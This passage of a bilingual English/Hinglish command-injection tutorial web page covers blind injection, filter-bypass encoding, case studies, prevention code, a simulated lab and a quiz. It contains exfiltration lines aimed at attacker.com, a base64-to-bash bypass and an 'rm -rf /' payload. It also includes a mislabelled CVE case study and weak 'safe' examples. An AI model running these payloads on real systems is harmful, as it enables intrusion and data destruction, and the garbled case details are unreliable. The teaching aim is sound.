        <!-- Blind Injection -->
        <div class="technique" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-orange); background: rgba(255, 136, 0, 0.05);">
          <h4 style="color: var(--neon-orange);">3. Blind Injection Detection</h4>
          <p class="en">Detect blind injection by observing side effects like delays or network traffic.</p>
          <p class="hi" style="display:none;">Delays ya network traffic jaise side effects observe karke blind injection detect karein.</p>
          <div class="code-block">
// Time-based detection:
// ping localhost && sleep 5
//
// DNS exfiltration:
// nslookup `id`.attacker.com
//
// HTTP requests:
// curl http://attacker.com/`whoami`
          </div>
        </div>

        <!-- Encoding and Obfuscation -->
        <div class="technique" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-pink); background: rgba(255, 0, 128, 0.05);">
          <h4 style="color: var(--neon-pink);">4. Encoding and Obfuscation</h4>
          <p class="en">Encode commands to bypass filters and detection systems.</p>
          <p class="hi" style="display:none;">Filters aur detection systems ko bypass karne ke liye commands encode karein.</p>
          <div class="code-block">
// Obfuscation techniques:
// Base64: echo "d2hvYW1p" | base64 -d | bash
// Hex: $(printf '\x77\x68\x6f\x61\x6d\x69')
// URL encoding: %77%68%6f%61%6d%69
// Command substitution: $(echo d2hvYW1p|base64 -d)
          </div>
        </div>
      </div>

      <!-- Real-World Case Studies -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">Real-World Command Injection Vulnerabilities</h3>
        <h3 class="hi" style="display:none;">Vastavik Duniya Ke Command Injection Vulnerabilities</h3>

        <div class="case-study" style="margin: 20px 0; padding: 20px; border: 1px solid var(--border); border-radius: 8px; background: rgba(0, 0, 0, 0.2);">
          <h4 style="color: var(--neon-green);">Case Study: GitLab RCE (CVE-2018-12613)</h4>
          <p class="en"><strong>Scenario:</strong> GitLab's wiki feature allowed command injection in project exports.</p>
          <p class="hi" style="display:none;"><strong>Paristhiti:</strong> GitLab ki wiki feature ne project exports mein command injection ki anumati di.</p>
          <p class="en"><strong>Exploitation:</strong> Used 'git clone' command with malicious repository names containing shell commands.</p>
          <p class="hi" style="display:none;"><strong>Doharpan:</strong> malicious repository names mein shell commands ka hansite hue 'git clone' command ka upyog kiya gaya.</p>
          <p class="en"><strong>Impact:</strong> Complete server compromise leading to $112,000+ bounty payment.</p>
          <p class="hi" style="display:none;"><strong>Prabhav:</strong> Puri server ke compromise hone se $112,000+ bounty payment mila.</p>
        </div>

        <div class="case-study" style="margin: 20px 0; padding: 20px; border: 1px solid var(--border); border-radius: 8px; background: rgba(0, 0, 0, 0.2);">
          <h4 style="color: var(--electric-blue);">Case Study: AWS CLI Command Injection</h4>
          <p class="en"><strong>Scenario:</strong> File upload feature in a CMS allowed command injection in filename parameter.</p>
          <p class="hi" style="display:none;"><strong>Paristhiti:</strong> Ek CMS mein file upload feature filename parameter mein command injection ki anumati deti thi.</p>
          <p class="en"><strong>Exploitation:</strong> Uploaded files with names containing shell commands that executed during file processing.</p>
          <p class="hi" style="display:none;"><strong>Doharpan:</strong> File processing ke dauran execute hone wale shell commands hansite hue files ko upload kiya gaya.</p>
          <p class="en"><strong>Impact:</strong> Arbitrary code execution leading to complete system takeover.</p>
          <p class="hi" style="display:none;"><strong>Prabhav:</strong> Pure system takeover tak pahuchne wali arbitrary code execution.</p>
        </div>
      </div>
    </div>
  </section>

  <!-- Section: Prevention -->
  <section id="prevention">
    <div class="container">
      <h2 class="section-title en">Prevention and Mitigation</h2>
      <h2 class="section-title hi" style="display:none;">Bachav aur Mitigation</h2>

      <!-- Prevention Visualization -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">Command Injection Prevention - Layered Defense</h3>
        <h3 class="hi" style="display:none;">Command Injection Bachav - Layered Defense</h3>
        <div class="diagram" style="margin: 30px 0;">
          <div class="box user-input" style="min-width: 150px;">
            <div class="en">User Input</div>
            <div class="hi" style="display:none;">User Input</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">Malicious</div>
          </div>
          <div class="arrow"></div>
          <div class="box app" style="min-width: 150px;">
            <div class="en">Validation & Sanitization</div>
            <div class="hi" style="display:none;">Validation & Sanitization</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">Input Filtering</div>
          </div>
          <div class="arrow"></div>
          <div class="box db" style="min-width: 150px;">
            <div class="en">Safe Execution</div>
            <div class="hi" style="display:none;">Surakshit Execution</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">Blocked</div>
          </div>
        </div>
      </div>

      <!-- Secure Coding Practices -->
      <div class="lecture-card animate-on-scroll" onmouseenter="highlightCard(this)" onmouseleave="unhighlightCard(this)" onclick="focusCard(this)">
        <h3 class="en">Secure Coding Practices</h3>
        <h3 class="hi" style="display:none;">Surakshit Coding Abhyas</h3>

        <!-- Input Validation -->
        <div class="practice" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-green); background: rgba(0, 255, 136, 0.05);">
          <h4 style="color: var(--neon-green);">1. Input Validation and Sanitization</h4>
          <p class="en">Validate and sanitize all user inputs before using them in system commands.</p>
          <p class="hi" style="display:none;">System commands mein use karne se pahle sabhi user inputs ko validate aur sanitize karein.</p>
          <div class="code-block">
// Python example:
import subprocess
import shlex

def safe_execute(command):
    # Use shlex.split() for safe parsing
    args = shlex.split(command)
    result = subprocess.run(args, capture_output=True, text=True)
    return result.stdout

// PHP example:
function execCommand($cmd) {
    $escaped = escapeshellcmd($cmd);
    return shell_exec($escaped);
}
          </div>
        </div>

        <!-- Use Safe APIs -->
        <div class="practice" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--electric-blue); background: rgba(0, 170, 255, 0.05);">
          <h4 style="color: var(--electric-blue);">2. Use Safe APIs and Libraries</h4>
          <p class="en">Replace dangerous functions with safe alternatives that don't invoke shell.</p>
          <p class="hi" style="display:none;">Shell ko invoke nahi karne wali safe alternatives se dangerous functions ko replace karein.</p>
          <div class="code-block">
// Instead of:
system($user_input);
exec($user_input);

// Use:
subprocess.run(['ls', '-la', '/safe/path']);
// Or use libraries that handle this safely
          </div>
        </div>

        <!-- Whitelist Approach -->
        <div class="practice" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-orange); background: rgba(255, 136, 0, 0.05);">
          <h4 style="color: var(--neon-orange);">3. Whitelist-Based Validation</h4>
          <p class="en">Only allow specific, safe characters and commands. Reject everything else.</p>
          <p class="hi" style="display:none;">Sirf specific, safe characters aur commands ki anumati dein. Baaki sabko reject karein.</p>
          <div class="code-block">
$allowed_commands = ['ls', 'cat', 'stat'];
$safe_chars = '/[a-zA-Z0-9._\-]/';

// Validate input
if (in_array($command, $allowed_commands) &&
    preg_match($safe_chars, $argument)) {
    execute($command, $argument);
} else {
    echo "Invalid command";
}
          </div>
        </div>

        <!-- Least Privilege -->
        <div class="practice" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-pink); background: rgba(255, 0, 128, 0.05);">
          <h4 style="color: var(--neon-pink);">4. Implement Least Privilege Principle</h4>
          <p class="en">Run web applications with minimal privileges to limit damage from successful exploitation.</p>
          <p class="hi" style="display:none;">Successful exploitation se damage ko limit karne ke liye minimal privileges ke saath web applications run karein.</p>
          <div class="code-block">
// Linux: Create dedicated user
useradd --system --shell /usr/sbin/nologin webapp

// PHP: Drop privileges after startup
posix_setuid(posix_getpwnam('webapp')['uid']);
posix_setgid(posix_getpwnam('webapp')['gid']);
          </div>
        </div>
      </div>

      <!-- Lab Environment Simulation -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">Testing Command Injection Prevention</h3>
        <h3 class="hi" style="display:none;">Command Injection Bachav Ko Test Karatein</h3>
        <div class="interactive-demo animate-on-scroll">
          <h4 style="color: var(--neon-green);">Prevention Testing Lab</h4>
          <div class="demo-container">
            <div class="input-group">
              <label for="test-cmd" class="en">Test Command:</label>
              <label for="test-cmd" class="hi" style="display:none;">Test Command:</label>
              <input type="text" id="test-cmd" placeholder="Enter command to test prevention">
            </div>
            <button class="button" onclick="testPrevention()" style="background: var(--neon-blue);">Test Prevention</button>
            <div class="result-box" id="prevention-result">
// Prevention test results will appear here
            </div>
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- Section: Quiz -->
  <section id="quiz">
    <div class="container">
      <h2 class="section-title en">Knowledge Check</h2>
      <h2 class="section-title hi" style="display:none;">Jaankari Check Karein</h2>
      <div class="quiz-container animate-on-scroll">
        <h3 style="color: var(--neon-green); text-align: center; margin-bottom: 20px;" class="en">Test Your Command Injection Knowledge</h3>
        <h3 style="color: var(--neon-green); text-align: center; margin-bottom: 20px; display:none;" class="hi">Apni Command Injection Jaankari Ko Test Karein</h3>
        <div id="quiz-questions">
          <!-- Questions will be injected here -->
        </div>
        <div class="score-display" id="score-display">Score: 0 / 10</div>
        <button class="button quiz-submit" onclick="submitQuiz()">Submit Quiz</button>
      </div>
    </div>
  </section>

  <!-- Footer -->
  <footer>
    <div class="container">
      <h3 class="en">By Ankush Rana | HTB Elite Hacker | Senior Security Engineer</h3>
      <h3 class="hi" style="display:none;">Ankush Rana Dwara | HTB Elite Hacker | Senior Security Engineer</h3>
      <p class="en">Breaking Systems. Building Defenses.</p>
      <p class="hi" style="display:none;">Systems todte hain. Defenses banate hain.</p>

      <div class="social-links">
        <a href="https://github.com/ankushrana6395" target="_blank" class="social-link github">
          <i class="fab fa-github"></i>
        </a>
        <a href="mailto:ankushrana6395@gmail.com" class="social-link email">
          <i class="fas fa-envelope"></i>
        </a>
        <a href="https://app.hackthebox.com/profile/117501" target="_blank" class="social-link htb">
          <i class="fas fa-cube"></i>
        </a>
      </div>

      <p style="margin-top: 30px;" class="en">&copy; 2025 Ankush Rana. All Rights Reserved.</p>
      <p style="margin-top: 30px; display:none;" class="hi">&copy; 2025 Ankush Rana. Sabhi Adhikar Sanchit Hai.</p>
    </div>
  </footer>

  <!-- Three.js -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
  <script>    let isHinglish = false;




    // Card Interaction Functions (defined first to ensure they're available)
    function highlightCard(card) {
      card.classList.add('pop-out');
      showNotification('Hovering: ' + card.querySelector('h3').textContent);
    }
    function unhighlightCard(card) {
      if (!card.classList.contains('focused')) {
        card.classList.remove('pop-out');
      }
    }
    function focusCard(card) {
      document.querySelectorAll('.lecture-card').forEach(c => {
        c.classList.remove('focused');
        c.classList.remove('pop-out');
      });
      card.classList.add('focused');
      card.classList.add('pop-out');
      showNotification('Focused on: ' + card.querySelector('h3').textContent);
    }

    // Initialize Three.js
    const canvas = document.getElementById('three-canvas');
    const scene = new THREE.Scene();
    const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
    const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
    renderer.setSize(window.innerWidth, window.innerHeight);
    renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));

    // Grid
    const gridHelper = new THREE.GridHelper(100, 100, 0x00ff88, 0x003322);
    gridHelper.position.z = -20;
    scene.add(gridHelper);

    // Floating Points
    const geometry = new THREE.BufferGeometry();
    const count = 500;
    const positions = new Float32Array(count * 3);
    for (let i = 0; i < count * 3; i++) {
      positions[i] = (Math.random() - 0.5) * 100;
    }
    geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
    const material = new THREE.PointsMaterial({ color: 0x00ff88, size: 0.5, transparent: true, opacity: 0.8 });
    const points = new THREE.Points(geometry, material);
    scene.add(points);

    // Add floating cubes
    const cubeGeometry = new THREE.BoxGeometry(2, 2, 2);
    const cubeMaterial = new THREE.MeshBasicMaterial({
      color: 0x00aaff,
      wireframe: true,
      transparent: true,
      opacity: 0.5
    });
    const cubes = [];
    for (let i = 0; i < 10; i++) {
      const cube = new THREE.Mesh(cubeGeometry, cubeMaterial);
      cube.position.x = (Math.random() - 0.5) * 50;
      cube.position.y = (Math.random() - 0.5) * 50;
      cube.position.z = (Math.random() - 0.5) * 50;
      cube.rotation.x = Math.random() * Math.PI;
      cube.rotation.y = Math.random() * Math.PI;
      cubes.push({ mesh: cube, speed: Math.random() * 0.02 });
      scene.add(cube);
    }

    camera.position.z = 30;

    // Animation
    function animate() {
      requestAnimationFrame(animate);
      gridHelper.rotation.y += 0.005;
      points.rotation.y += 0.003;
      cubes.forEach(cube => {
        cube.mesh.rotation.x += cube.speed;
        cube.mesh.rotation.y += cube.speed;
      });
      renderer.render(scene, camera);
    }
    animate();

    // Resize
    window.addEventListener('resize', () => {
      camera.aspect = window.innerWidth / window.innerHeight;
      camera.updateProjectionMatrix();
      renderer.setSize(window.innerWidth, window.innerHeight);
    });


    // Keyword Modal
    const keywordModal = document.getElementById('keyword-modal');
    const modalTitle = document.getElementById('modal-title');
    const modalBody = document.getElementById('modal-body');
    const modalClose = document.getElementById('modal-close');

    if (keywordModal && modalTitle && modalBody && modalClose) {
      document.querySelectorAll('.keyword').forEach(keyword => {
        keyword.addEventListener('click', function(e) {
          e.stopPropagation();
          modalTitle.textContent = this.getAttribute('data-title');
          modalBody.textContent = this.getAttribute('data-content');
          keywordModal.classList.add('active');
        });
      });

      modalClose.addEventListener('click', () => {
        keywordModal.classList.remove('active');
      });

      keywordModal.addEventListener('click', (e) => {
        if (e.target === keywordModal) {
          keywordModal.classList.remove('active');
        }
      });
    }

    // Language Toggle

    const translatorBtn = document.getElementById('translator-btn-1');
    function toggleLanguage() {
      isHinglish = !isHinglish;
      const enElements = document.querySelectorAll('.en');
      const hiElements = document.querySelectorAll('.hi');

      enElements.forEach(el => {
        if (el && el.style) {
          el.style.display = isHinglish ? 'none' : 'block';
        }
      });

      hiElements.forEach(el => {
        if (el && el.style) {
          el.style.display = isHinglish ? 'block' : 'none';
        }
      });

      if (translatorBtn) {
        translatorBtn.textContent = isHinglish ? 'üåê English On' : 'üåê Hinglish On';
      }

      showNotification(isHinglish ? 'Hinglish mode activated!' : 'English mode activated!');
    }

    // Demo Functions
    function runCommandInjection() {
      const input = document.getElementById('cmd-input')?.value || '';
      const result = document.getElementById('cmd-result');

      if (!result) return;

      if (input) {
        // Simulate command injection output
        let output = '';

        if (input.includes('whoami')) {
          output = 'www-data';
        } else if (input.includes('ls')) {
          output = `total 12\ndrwxr-xr-x 2 root root 4096 Jan 1 00:00 .\ndrwxr-xr-x 1 root root 4096 Jan 1 00:00 ..\n-rw-r--r-- 1 root root  123 Jan 1 00:00 flag.txt\n-rw-r--r-- 1 root root   45 Jan 1 00:00 config.php`;
        } else if (input.includes('cat /etc/passwd')) {
          output = `root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nuser:x:1000:1000:user:/home/user:/bin/bash`;
        } else if (input.includes('pwd')) {
          output = '/var/www/html';
        } else if (input.includes('id')) {
          output = 'uid=33(www-data) gid=33(www-data) groups=33(www-data)';
        } else {
          output = `Executed: ${input}`;
        }

        result.textContent = output;
        showNotification(isHinglish ? 'Command executed!' : 'Command executed!');
      } else {
        result.textContent = isHinglish ? 'Please enter a command' : 'Please enter a command';
      }
    }

    function runAdvancedInjection() {
      const input = document.getElementById('advanced-input')?.value || '';
      const result = document.getElementById('advanced-result');

      if (!result) return;

      if (input) {
        // Simulate advanced command injection
        let output = 'Advanced command executed: ' + input;
        if (input.includes('; whoami')) {
          output = 'www-data\nCommand chaining successful';
        } else if (input.includes('>')) {
          output = 'File redirected successfully\nData written to file';
        } else if (input.includes('echo') && input.includes('base64')) {
          output = 'd2hvYW1p\nCommand decoded: whoami';
        }

        result.textContent = output;
        showNotification(isHinglish ? 'Advanced command executed!' : 'Advanced command executed!');
      } else {
        result.textContent = isHinglish ? 'Please enter an advanced payload' : 'Please enter an advanced payload';
      }
    }

    function testPrevention() {
      const input = document.getElementById('test-cmd')?.value || '';
      const result = document.getElementById('prevention-result');

      if (!result) return;

      // Check for dangerous characters
      const dangerousChars = /[\;\|\&\$\`]/;

      if (dangerousChars.test(input)) {
        result.innerHTML = `<span style="color: #ff8800">‚ùå Command Injection Detected!</span><br>This would have been blocked by proper input validation.`;
      } else {
        result.innerHTML = `<span style="color: #00ff88">‚úÖ Command Passed Prevention Filters</span><br>This input appears safe.`;
      }
    }

    // Quiz Questions (10 Questions)
    const quizQuestions = [
      {
        question: {
          en: "What is command injection?",
          hi: "Command injection kya hota hai?"
        },
        options: {
          en: [
            "Injecting SQL into database queries",
            "Injecting OS commands into system calls",
            "Injecting HTML into web pages",
            "Injecting JavaScript into forms"
          ],
          hi: [
            "Database queries mein SQL inject karna",
            "System calls mein OS commands inject karna",
            "Web pages mein HTML inject karna",
            "Forms mein JavaScript inject karna"
          ]
        },
        correct: 1,
        explanation: {
          en: "Command injection allows attackers to execute OS commands through vulnerable applications.",
          hi: "Command injection attackers ko vulnerable applications ke zariye OS commands execute karne ki anumati deta hai‡•§"
        }
      },
      {
        question: {
          en: "Which character is commonly used for command chaining?",
          hi: "Command chaining ke liye kaunsa character aam taur par use hota hai?"
        },
        options: {
          en: [
            "&",
            ";",
            ".",
            "*"
          ],
          hi: [
            "&",
            ";",
            ".",
            "*"
          ]
        },
        correct: 1,
        explanation: {
          en: "The semicolon (;) allows chaining commands regardless of success/failure of previous command.",
          hi: "Semicolon (;) previous command ke success/failure se ir-respective commands ko chain karne ki anumati deta hai‡•§"
        }
      },
      {
        question: {
          en: "What does 'blind' command injection mean?",
          hi: "'Andha' command injection ka kya arth hai?"
        },
        options: {
          en: [
            "Commands execute without output",
            "Commands are invisible to firewalls",
            "Commands work only in dark mode",
            "Commands require special tools"
          ],
          hi: [
            "Commands bina output ke execute hote hain",
            "Commands firewall ko nazar nahi aate",
            "Commands sirf dark mode mein kaam karte hain",
            "Commands ko special tools ki zaroorat hoti hai"
          ]
        },
        correct: 0,
        explanation: {
          en: "Blind injection occurs when commands execute but output isn't visible to the attacker.",
          hi: "Andhi injection tab hoti hai jab commands execute hote hain lekin output attacker ko nazar nahi aata‡•§"
        }
      },
      {
        question: {
          en: "Which function is more secure than system()?",
          hi: "system() se kaunsi function adhik surakshit hai?"
        },
        options: {
          en: [
            "exec()",
            "passthru()",
            "subprocess.run() with array",
            "shell_exec()"
          ],
          hi: [
            "exec()",
            "passthru()",
            "subprocess.run() with array",
            "shell_exec()"
          ]
        },
        correct: 2,
        explanation: {
          en: "subprocess.run() with command as array prevents shell injection attacks.",
          hi: "subprocess.run() command ko array ke rup mein use karne se shell injection attacks prevent karta hai‡•§"
        }
      },
      {
        question: {
          en: "What does 'whoami' command return in command injection?",
          hi: "Command injection mein 'whoami' command kya return karta hai?"
        },
        options: {
          en: [
            "Current user name",
            "System architecture",
            "Network information",
            "Current directory"
          ],
          hi: [
            "Current user ka naam",
            "System architecture",
            "Network information",
            "Current directory"
          ]
        },
        correct: 0,
        explanation: {
          en: "'whoami' returns the current user running the web application process.",
          hi: "'whoami' web application process ko run karne wale current user ko return karta hai‡•§"
        }
      },
      {
        question: {
          en: "Which encoding technique can bypass filters?",
          hi: "Kaunsi encoding technique filters ko bypass kar sakti hai?"
        },
        options: {
          en: [
            "MD5",
            "Base64",
            "SHA-256",
            "AES"
          ],
          hi: [
            "MD5",
            "Base64",
            "SHA-256",
            "AES"
          ]
        },
        correct: 1,
        explanation: {
          en: "Base64 can be used to encode malicious commands to bypass character filters.",
          hi: "Base64 malicious commands ko encode karne ke liye use ho sakta hai to bypass character filters‡•§"
        }
      },
      {
        question: {
          en: "What's the primary prevention method?",
          hi: "Primary prevention method kya hai?"
        },
        options: {
          en: [
            "Input sanitization",
            "Firewall rules",
            "Rate limiting",
            "Two-factor authentication"
          ],
          hi: [
            "Input sanitization",
            "Firewall rules",
            "Rate limiting",
            "Two-factor authentication"
          ]
        },
        correct: 0,
        explanation: {
          en: "Proper input validation and sanitization prevents command injection.",
          hi: "Proper input validation aur sanitization command injection prevent karta hai‡•§"
        }
      },
      {
        question: {
          en: "Which operator executes command substitution?",
          hi: "Kaunsa operator command substitution execute karta hai?"
        },
        options: {
          en: [
            "$(command)",
            "if command",
            "for command",
            "while command"
          ],
          hi: [
            "$(command)",
            "if command",
            "for command",
            "while command"
          ]
        },
        correct: 0,
        explanation: {
          en: "$(command) executes a command and substitutes its output into the containing string.",
          hi: "$(command) ek command ko execute karta hai aur uski output ko containing string mein substitute karta hai‡•§"
        }
      },
      {
        question: {
          en: "What's the safest way to run system commands?",
          hi: "System commands run karne ka sabse surakshit tarika kya hai?"
        },
        options: {
          en: [
            "Use whitelist of allowed commands",
            "Run commands as root user",
            "Using shell for everything",
            "Directly execute user input"
          ],
          hi: [
            "Allowed commands ka whitelist use karein",
            "Commands ko root user ke rup mein run karein",
            "Sab kuch ke liye shell use karein",
            "User input ko directly execute karein"
          ]
        },
        correct: 0,
        explanation: {
          en: "Whitelist approach only allows specific, safe commands to be executed.",
          hi: "Whitelist approach sirf specific, safe commands ko execute karne ki anumati deta hai‡•§"
        }
      },
      {
        question: {
          en: "Which of these is NOT a command injection pattern?",
          hi: "Ye mein se kaunsa command injection pattern NAHI hai?"
        },
        options: {
          en: [
            "'; rm -rf /'",
            "system($user_input)",
            "subprocess.run([args])",
            "exec($command)"
          ],
          hi: [
            "'; rm -rf /'",
            "system($user_input)",
            "subprocess.run([args])",
            "exec($command)"
          ]
        },
        correct: 2,
        explanation: {
          en: "subprocess.run() with array arguments is safe because it doesn't use shell.",
          hi: "subprocess.run() array arguments ke saath safe hai kyunki woh shell use nahi karta‡•§"
        }
      }
    ];

    // Render Quiz
    function renderQuiz() {
      const quizContainer = document.getElementById('quiz-questions');
      if (!quizContainer) return;
      quizContainer.innerHTML = '';
      quizQuestions.forEach((q, index) => {
        const questionDiv = document.createElement('div');
        questionDiv.className = 'quiz-question';
        const qText = isHinglish ? q.question.hi : q.question.en;
        const opts = isHinglish ? q.options.hi : q.options.en;
        questionDiv.innerHTML = `
          <h4>Q${index + 1}: ${qText}</h4>
          <div class="options" id="options-${index}">
            ${opts.map((opt, i) => `
              <div class="option" onclick="selectOption(${index}, ${i})">${opt}</div>
            `).join('')}
          </div>
        `;
        quizContainer.appendChild(questionDiv);
      });
    }

    // Track selected answers
    const selectedAnswers = new Array(quizQuestions.length).fill(-1);

    // Select Option
    window.selectOption = function(questionIndex, optionIndex) {
      const optionsContainer = document.getElementById(`options-${questionIndex}`);
      if (!optionsContainer) return;

      document.querySelectorAll(`#options-${questionIndex} .option`).forEach(opt => {
        opt.classList.remove('selected');
      });
      const selectedOption = document.querySelectorAll(`#options-${questionIndex} .option`)[optionIndex];
      if (selectedOption) {
        selectedOption.classList.add('selected');
        selectedAnswers[questionIndex] = optionIndex;
      }
    };

    // Submit Quiz
    window.submitQuiz = function() {
      let score = 0;
      const feedback = document.getElementById('feedback');
      if (!feedback) return;

      feedback.innerHTML = '';
      feedback.style.display = 'block';

      quizQuestions.forEach((q, index) => {
        const options = document.querySelectorAll(`#options-${index} .option`);
        const explanation = isHinglish ? q.explanation.hi : q.explanation.en;

        if (selectedAnswers[index] === q.correct) {
          score++;
          if (options.length > 0) options[q.correct].classList.add('correct');
          if (selectedAnswers[index] !== -1 && options.length > selectedAnswers[index]) {
            options[selectedAnswers[index]].classList.add('correct');
          }
        } else {
          if (options.length > 0) options[q.correct].classList.add('correct');
          if (selectedAnswers[index] !== -1 && options.length > selectedAnswers[index] && selectedAnswers[index] !== q.correct) {
            options[selectedAnswers[index]].classList.add('incorrect');
          }
        }

        feedback.innerHTML += `<strong>Q${index + 1}:</strong> ${explanation}<br><br>`;
      });

      const scoreDisplay = document.getElementById('score-display');
      if (scoreDisplay) {
        scoreDisplay.textContent = `Score: ${score} / ${quizQuestions.length}`;
      }
      showNotification(isHinglish ? `Quiz pura! Score: ${score}/${quizQuestions.length}` : `Quiz complete! You scored ${score}/${quizQuestions.length}`);
    };

    // Notification
    function showNotification(message) {
      const notification = document.getElementById('notification');
      const notificationText = document.getElementById('notification-text');
      if (notification && notificationText) {
        notificationText.textContent = message;
        notification.classList.add('show');
        setTimeout(() => notification.classList.remove('show'), 3000);
      }
    }

    // Scroll Progress Bar
    window.addEventListener('scroll', () => {
      const winHeight = window.innerHeight;
      const docHeight = document.documentElement.scrollHeight;
      const scrollTop = window.pageYOffset;
      const trackLength = docHeight - winHeight;
      const progress = scrollTop / trackLength * 100;
      const progressBar = document.getElementById('progress-bar');
      if (progressBar) {
        progressBar.style.width = progress + '%';
      }
    });

    // Animation on Scroll
    document.addEventListener('DOMContentLoaded', () => {
      const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
          if (entry.isIntersecting) entry.target.classList.add('visible');
        });
      }, { threshold: 0.1 });
      document.querySelectorAll('.animate-on-scroll').forEach(el => observer.observe(el));
      renderQuiz();
    });
  </script>
</body>
</html>
